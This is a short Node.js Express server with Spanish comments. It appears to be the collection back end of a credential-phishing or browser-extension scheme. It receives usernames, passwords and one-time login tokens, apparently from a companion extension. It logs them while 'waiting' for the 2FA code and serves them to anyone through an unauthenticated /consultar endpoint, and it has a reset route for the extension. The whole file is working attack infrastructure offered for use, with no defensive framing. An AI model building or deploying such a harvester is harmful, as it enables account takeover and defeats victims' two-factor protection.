const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false
};

app.post('/recibir', (req, res) => {
    const { user, pass, token, origen } = req.body;

    // --- LÓGICA CORREGIDA ---
    let tokenFinal;

    if (origen === "LOGIN_INICIAL") {
        // Obligamos a que el token sea null al empezar
        tokenFinal = null;
    } else if (token !== undefined && token !== "") {
        // Solo si envías un token real, lo guardamos
        tokenFinal = token;
    } else {
        // Si no es login inicial y no envías token, 
        // mantenemos el que está solo si es el MISMO usuario
        tokenFinal = (user === baseDeDatosTemporal.user) ? baseDeDatosTemporal.token : null;
    }

    baseDeDatosTemporal = {
        user: user || baseDeDatosTemporal.user,
        pass: pass || baseDeDatosTemporal.pass,
        token: tokenFinal,
        origen: origen,
        actualizado: true
    };

    console.log("===============================");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`📲 Token: ${baseDeDatosTemporal.token === null ? "ESPERANDO..." : baseDeDatosTemporal.token}`);
    console.log("===============================");

    res.status(200).send("OK");
});


// --- NUEVA RUTA: LIMPIAR DATOS (AÑADE ESTO AQUÍ) ---
app.post('/limpiar', (req, res) => {
    baseDeDatosTemporal = {
        user: null,
        pass: null,
        token: null,
        origen: null,
        actualizado: false
    };
    console.log("🧹 Base de datos reseteada por la extensión.");
    res.status(200).send("Limpiado");
});

app.get('/consultar', (req, res) => {
    res.json(baseDeDatosTemporal);
});

app.get('/', (req, res) => {
    res.send("Servidor Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`Puerto ${PORT}`); });
